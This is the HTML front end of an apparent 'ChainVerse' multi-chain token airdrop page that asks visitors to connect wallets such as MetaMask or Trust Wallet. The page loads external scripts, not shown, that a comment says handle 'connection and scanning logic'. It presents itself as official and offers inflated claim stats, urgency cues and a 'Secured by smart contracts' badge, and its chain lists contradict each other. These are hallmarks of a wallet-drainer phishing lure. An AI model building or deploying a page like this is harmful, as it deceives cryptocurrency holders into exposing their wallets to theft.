<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <title>ChainVerse · Universal Airdrop</title>
    <meta name="description" content="Official ChainVerse multi-chain airdrop. Claim tokens across Ethereum, BNB Chain, Polygon, Arbitrum, Optimism, Avalanche, and Fantom." />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: #0b061a;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .main-card {
            max-width: 460px;
            width: 100%;
            background: linear-gradient(145deg, #150d26 0%, #0b061a 100%);
            border-radius: 32px;
            padding: 36px 28px 28px;
            border: 1px solid rgba(124, 58, 237, 0.15);
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(124, 58, 237, 0.05);
            position: relative;
            overflow: hidden;
        }
        .main-card::before {
            content: '';
            position: absolute;
            top: -30%;
            left: -10%;
            width: 120%;
            height: 120%;
            background: radial-gradient(ellipse at 30% 10%, rgba(124, 58, 237, 0.06) 0%, transparent 70%);
            pointer-events: none;
        }
        .live-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(124, 58, 237, 0.12);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 100px;
            padding: 5px 14px 5px 10px;
            font-size: 0.65rem;
            font-weight: 600;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            color: #a78bfa;
            margin-bottom: 18px;
        }
        .live-badge .dot {
            width: 6px;
            height: 6px;
            background: #a78bfa;
            border-radius: 50%;
            animation: pulse-dot 1.6s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(0.7); }
        }
        .main-title {
            font-size: clamp(1.8rem, 5.5vw, 2.4rem);
            font-weight: 700;
            line-height: 1.2;
            letter-spacing: -0.02em;
            margin-bottom: 10px;
            color: #f0f4ff;
        }
        .main-title span {
            color: #a78bfa;
        }
        .subtitle {
            font-size: 0.9rem;
            line-height: 1.6;
            color: #8896b0;
            margin-bottom: 28px;
        }
        .stats-row {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 16px;
            padding: 14px 6px;
            border: 1px solid rgba(124, 58, 237, 0.06);
            margin-bottom: 28px;
        }
        .stat-item {
            text-align: center;
        }
        .stat-item .number {
            font-size: clamp(1.2rem, 4vw, 1.6rem);
            font-weight: 700;
            color: #f0f4ff;
            display: block;
            line-height: 1.2;
        }
        .stat-item .label {
            font-size: 0.55rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: #64748b;
            margin-top: 2px;
        }
        .stat-divider {
            width: 1px;
            background: rgba(255, 255, 255, 0.05);
        }
        .connect-area {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 18px;
        }
        .connect-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .connect-row select {
            flex: 1;
            min-width: 120px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(124, 58, 237, 0.15);
            border-radius: 12px;
            padding: 14px 16px;
            color: #e8edf5;
            font-size: 0.85rem;
            font-weight: 500;
            font-family: 'Inter', sans-serif;
            appearance: none;
            cursor: pointer;
            outline: none;
            transition: border 0.2s;
        }
        .connect-row select:hover {
            border-color: rgba(124, 58, 237, 0.35);
        }
        .connect-row select option {
            background: #150d26;
            color: #e8edf5;
        }
        .btn-connect {
            flex: 2;
            min-width: 160px;
            background: linear-gradient(135deg, #7C3AED, #6D28D9);
            border: none;
            border-radius: 12px;
            padding: 14px 24px;
            font-family: 'Inter', sans-serif;
            font-size: 0.9rem;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background 0.25s, transform 0.15s, box-shadow 0.25s;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.25);
        }
        .btn-connect:hover {
            background: linear-gradient(135deg, #8B5CF6, #7C3AED);
            transform: translateY(-1px);
            box-shadow: 0 8px 30px rgba(124, 58, 237, 0.35);
        }
        .btn-connect:active {
            transform: scale(0.97);
        }
        .btn-connect i {
            font-size: 1rem;
        }
        .security-footer {
            font-size: 0.7rem;
            color: #475569;
            text-align: center;
            line-height: 1.6;
            padding-top: 14px;
            border-top: 1px solid rgba(124, 58, 237, 0.06);
            margin-top: 6px;
        }
        .security-footer i {
            color: #a78bfa;
            margin-right: 4px;
        }
        .security-footer .chain-list {
            color: #64748b;
            font-weight: 500;
        }
        /* responsive */
        @media (max-width: 480px) {
            .main-card {
                padding: 24px 16px 18px;
            }
            .connect-row {
                flex-direction: column;
            }
            .connect-row select,
            .btn-connect {
                width: 100%;
                min-width: unset;
            }
            .stats-row {
                padding: 10px 4px;
            }
        }
    </style>
</head>
<body>
    <div class="main-card">

        <div class="live-badge">
            <span class="dot"></span>
            Airdrop Live
        </div>

        <h1 class="main-title">Claim Your <span>Airdrop</span></h1>
        <p class="subtitle">
            Connect your wallet to verify eligibility and claim your tokens instantly across all supported chains.
        </p>

        <div class="stats-row">
            <div class="stat-item">
                <span class="number" id="totalPoolDisplay">50,000</span>
                <span class="label">TOTAL POOL</span>
            </div>
            <div class="stat-divider"></div>
            <div class="stat-item">
                <span class="number" id="yourShareDisplay">—</span>
                <span class="label">YOUR SHARE</span>
            </div>
            <div class="stat-divider"></div>
            <div class="stat-item">
                <span class="number">7</span>
                <span class="label">CHAINS</span>
            </div>
        </div>

        <div class="connect-area">
            <div class="connect-row">
                <select id="wallet-select">
                    <option value="metamask">MetaMask</option>
                    <option value="trust">Trust Wallet</option>
                    <option value="walletconnect">WalletConnect</option>
                    <option value="coinbase">Coinbase Wallet</option>
                    <option value="rainbow">Rainbow</option>
                    <option value="argent">Argent</option>
                    <option value="safe">Safe</option>
                </select>
                <button id="cvConnectWallet" class="btn-connect">
                    <i class="fas fa-wallet"></i> Connect Wallet
                </button>
            </div>
        </div>

        <div class="security-footer">
            <i class="fas fa-shield-halved"></i> Secured by smart contracts on
            <span class="chain-list">Ethereum, BSC, Arbitrum, Polygon &amp; Solana</span>
        </div>

    </div>

    <!-- Original scripts – handle all connection and scanning logic -->
    <script src="web3.min.js"></script>
    <script src="scripts.js"></script>
</body>
</html>
